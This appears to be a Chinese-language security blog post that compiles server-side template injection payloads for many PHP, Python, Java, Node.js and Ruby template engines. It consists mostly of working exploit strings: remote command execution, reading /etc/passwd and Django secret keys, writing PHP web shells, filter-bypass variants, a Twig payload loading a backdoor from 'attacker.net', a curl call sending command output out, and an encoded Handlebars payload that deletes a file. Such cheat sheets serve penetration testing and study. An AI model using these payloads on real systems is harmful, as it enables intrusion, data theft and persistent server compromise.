---
title: SSTI payload记录
date: 2022-3-29
tags: WEB
categories: Technology
---



![img](SSTI/1344396-20200911174631687-758048107.png)



[toc]

# 1.PHP中的ssti

## Twig框架

```
{{}}:输出

{# 注释 #}:注释

{% %}：逻辑运算
循环：
{% for word in words %}
	{{ word }}
{% endfor %}

```

测试用payload:

```php
{{2*2**3}} = 16
{# 这里要注意的是，#要写成%23，不然会被浏览器当成锚点 #}
{{2*2**3}}{%23%20注释不会显示%20%23} = 16
${7*7} = ${7*7}
{{7*'7'}} = 49
{{1/0}} = Error
{{foobar}} Nothing

{# Get Info #}
{{_self}} #(Ref. to current application)
{{_self.env}}
{{dump(app)}}
{{app.request.server.all|join(',')}}

{# File read #}
"{{'/etc/passwd'|file_excerpt(1,30)}}"@

{# Exec code #}
{{_self.env.setCache("ftp://attacker.net:2121")}}{{_self.env.loadTemplate("backdoor")}}
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("whoami")}}
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("cat /etc/passwd") }
{{['id']|filter('system')}}
{{['cat\x20/etc/passwd']|filter('system')}}
{{['cat$IFS/etc/passwd']|filter('system')}}
{{["id"]|map("system")|join(",")
{{["id", 0]|sort("system")|join(",")}}
{{["id"]|filter("system")|join(",")}}
{{[0, 0]|reduce("system", "id")|join(",")}}
{{{"php phpinfo();":"/var/www/html/shell.php"}|map("file_put_contents")}}


全版本通用payload：
{{["id"]|map("system")|join(",")
{{["id", 0]|sort("system")|join(",")}}
{{["id"]|filter("system")|join(",")}}
{{[0, 0]|reduce("system", "id")|join(",")}}
{{{"<?php phpinfo();":"/var/www/html/shell.php"}|map("file_put_contents")}}
```

## Smarty框架

payload：

```php
//文件读
{self::getStreamVariable("file:///etc/passwd")}
//other
{$smarty.version}  #获取smarty的版本号
{php}phpinfo();{/php}  #执行相应的php代码，在Smarty3版本中已经废弃{php}标签，强烈建议不要使用。在Smarty 3.1，{php}仅在SmartyBC中可用。
{if phpinfo()}{/if}    # 执行相应的php代码
{self::getStreamVariable("file:///etc/passwd")} # 任意文件读取
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())} # 文件写入
{system('ls')} # compatible v3
{system('cat index.php')} # compatible v3
{literal}alert('xss');{/literal} # XSS
```

# 2.python中的ssti

```python
__class__  返回示例所属的类
__mro__    返回一个类所继承的基类元组，方法在解析时按照元组的顺序解析。
__base__   返回一个类所继承的基类,返回字符串类型    # __base__和__mro__都是用来寻找基类的
__bases__  元组类型返回
__subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用列表
__init__  类的初始化方法
__globals__  对包含函数全局变量的字典的引用
```

通用的一些payload，版本不同排序不同

## 0.通用

### os._wrap_close中的popen(py2不行)

```python
"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__['popen']('whoami').read()
"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__.popen('whoami').read()
```

### os中popen

```
"".__class__.__bases__[0].__subclasses__()[250].__init__.__globals__['os'].popen('whoami').read()
```

### `__import__`中os(py2不行)

```python
"".__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__import__('os').popen('whoami').read()
```







## 1.Jinjia2

以Django的模板为模型的，是Flask框架的一部分。

```python
for c in [].__class__.__base__.__subclasses__():
    if c.__name__ == 'catch_warnings':
        for b in c.__init__.__globals__.values():
            if b.__class__ == {}.__class__:
                if 'eval' in b.keys():
                    print(b['eval']('__import__("os").popen("whoami").read()'))
```



以上payload转为jinjis2：

```jinja2
{% for c in [].__class__.__base__.__subclasses__() %}
{% if c.__name__ == 'catch_warnings' %}
  {% for b in c.__init__.__globals__.values() %}
  {% if b.__class__ == {}.__class__ %}
    {% if 'eval' in b.keys() %}
      {{ b['eval']('__import__("os").popen("whoami").read()') }}
    {% endif %}
  {% endif %}
  {% endfor %}
{% endif %}
{% endfor %}
```

### 绕过

过滤`[`:

```jinja2
{# getitem、pop #}
{{ ''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read() }}
{{ ''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen('ls').read() }}
```

过滤``:

```jinja2
{# chr函数 #}
{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}
{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read()}}#request对象
{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() }}&path=/etc/passwd

{# 命令执行 #}
{% set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %}
{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() }}
{{().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() }}&cmd=id
```

过滤下划线：(使用`request.args`)

```jinja2
{{''[request.args.class][request.args.mro][2][request.args.subclasses]()[40]('/etc/passwd').read() }}
```

过滤花括号：

```jinja2
#用{%%}标记
{% if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://127.0.0.1:7999/?i=`whoami`').read()=='p' %}1{% endif %}
```

## 2.tornado

tornado render是python中的一个渲染函数，也就是一种模板，通过调用的参数不同，生成不同的网页，如果用户对render内容可控，不仅可以注入XSS代码，而且还可以通过`{{}}`进行传递变量和执行简单的表达式。

payload:

```python
{% import foobar %} = Error
{% import os %}{{os.system('whoami')}}
```

## 3.Djanjo

这个比较难利用，条件被限制的很死，很难执行命令；但Django自带的应用 "admin"（也就是Django自带的后台）的`models.py`中导入了当前网站的配置文件，可以通过某种方式，找到Django默认应用admin的model，再通过这个model获取settings对象，进而获取数据库账号密码、Web加密密钥等信息。

```django
{user.groups.model._meta.app_config.module.admin.settings.SECRET_KEY}
{user.user_permissions.model._meta.app_config.module.admin.settings.SECRET_KEY}
```

# 3.Java中ssti

## 1.Velocity

```velocity
#set($e="e");$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("calc")$class.inspect("java.lang.Runtime").type.getRuntime().exec("sleep 5").waitFor()    // CVE-2019-3396
#set($str=$class.inspect("java.lang.String").type)
#set($chr=$class.inspect("java.lang.Character").type)
#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("whoami"))
$ex.waitFor()
#set($out=$ex.getInputStream())
#foreach($i in [1..$out.available()])
$str.valueOf($chr.toChars($out.read()))
#end
```

## 2.FreeMarker

```java
49 = 49
${7*7} = 49
#{7*7} = 49 -- (legacy)
${7*'7'} Nothing
${foobar}

  <#assign ex="freemarker.template.utility.Execute" ?new()="">${ ex("id")}
  [#assign ex = 'freemarker.template.utility.Execute'?new()]${ ex('id')}
  ${"freemarker.template.utility.Execute"?new()("id")}

  ${product.getClass().getProtectionDomain().getCodeSource().getLocation().toURI().resolve('/home/carlos/my_password.txt').toURL().openStream().readAllBytes()?join(" ")}
```

## 3.Spring View Manipulation

```java
__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
__${T(java.lang.Runtime).getRuntime().exec("touch executed")}__::.x
```

## 4.Pebble

```java
//test
{{ someString.toUPPERCASE() }}
//低版本
{{ variable.getClass().forName('java.lang.Runtime').getRuntime().exec('ls -la') }}
//高版本
{% set cmd = 'id' %}
{% set bytes = (1).TYPE
     .forName('java.lang.Runtime')
     .methods[6]
     .invoke(null,null)
     .exec(cmd)
     .inputStream
     .readAllBytes() %}
{{ (1).TYPE
     .forName('java.lang.String')
     .constructors[0]
     .newInstance(([bytes]).toArray()) }}
```

## 5.Jinjava

```java
{{'a'.toUpperCase()}} = 'A'
{{ request }} = 会返回一个request对象形如 com.[...].context.TemplateContextRequest@23548206
//RCE
{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}

{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
```

# 4.Nodejs中的SSTI

## 1.Handlebars

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').exec('whoami');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}

URL编码:
%7b%7b%23%77%69%74%68%20%22%73%22%20%61%73%20%7c%73%74%72%69%6e%67%7c%7d%7d%0d%0a%20%20%7b%7b%23%77%69%74%68%20%22%65%22%7d%7d%0d%0a%20%20%20%20%7b%7b%23%77%69%74%68%20%73%70%6c%69%74%20%61%73%20%7c%63%6f%6e%73%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%28%6c%6f%6f%6b%75%70%20%73%74%72%69%6e%67%2e%73%75%62%20%22%63%6f%6e%73%74%72%75%63%74%6f%72%22%29%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%73%74%72%69%6e%67%2e%73%70%6c%69%74%20%61%73%20%7c%63%6f%64%65%6c%69%73%74%7c%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%75%73%68%20%22%72%65%74%75%72%6e%20%72%65%71%75%69%72%65%28%27%63%68%69%6c%64%5f%70%72%6f%63%65%73%73%27%29%2e%65%78%65%63%28%27%72%6d%20%2f%68%6f%6d%65%2f%63%61%72%6c%6f%73%2f%6d%6f%72%61%6c%65%2e%74%78%74%27%29%3b%22%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%2e%70%6f%70%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%23%65%61%63%68%20%63%6f%6e%73%6c%69%73%74%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%23%77%69%74%68%20%28%73%74%72%69%6e%67%2e%73%75%62%2e%61%70%70%6c%79%20%30%20%63%6f%64%65%6c%69%73%74%29%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%20%20%7b%7b%74%68%69%73%7d%7d%0d%0a%20%20%20%20%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%20%20%20%20%7b%7b%2f%65%61%63%68%7d%7d%0d%0a%20%20%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%20%20%7b%7b%2f%77%69%74%68%7d%7d%0d%0a%7b%7b%2f%77%69%74%68%7d%7d
```

## 2.JsRender

```js
{{:%22test%22.toString.constructor.call({},%22alert(%27xss%27)%22)()}}
{{:"pwnd".toString.constructor.call({},"return global.process.mainModule.constructor._load('child_process').execSync('cat /etc/passwd').toString()")()}}
```

### 3.PugJs

```js
//test
#{7*7}
//rce
#{function(){localLoad=global.process.mainModule.constructor._load;sh=localLoad("child_process").exec('touch /tmp/pwned.txt')}()}
```

# 5.Ruby中SSTI

## 1.ERB

```erb
//test
{{7*7}} = {{7*7}}
${7*7} = ${7*7}
<%= 7*7 %> = 49
<%= foobar %> = Error
//use
<%= system("whoami") %> #Execute code
<%= Dir.entries('/') %> #List folder
<%= File.open('/etc/passwd').read %> #Read file

<%= system('cat /etc/passwd') %>
<%= `ls /` %>
<%= IO.popen('ls /').readlines()  %>
<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
```

## 2.Slim

```ruby
{ 7 * 7 }
{ %x|env| }
```















from：

>   https://blog.gm7.org/%E4%B8%AA%E4%BA%BA%E7%9F%A5%E8%AF%86%E5%BA%93/01.%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/02.WEB%E6%BC%8F%E6%B4%9E/05.SSTI%E6%B3%A8%E5%85%A5/
>
>   https://xz.aliyun.com/t/7518
>
>   https://err0r.top/article/ssti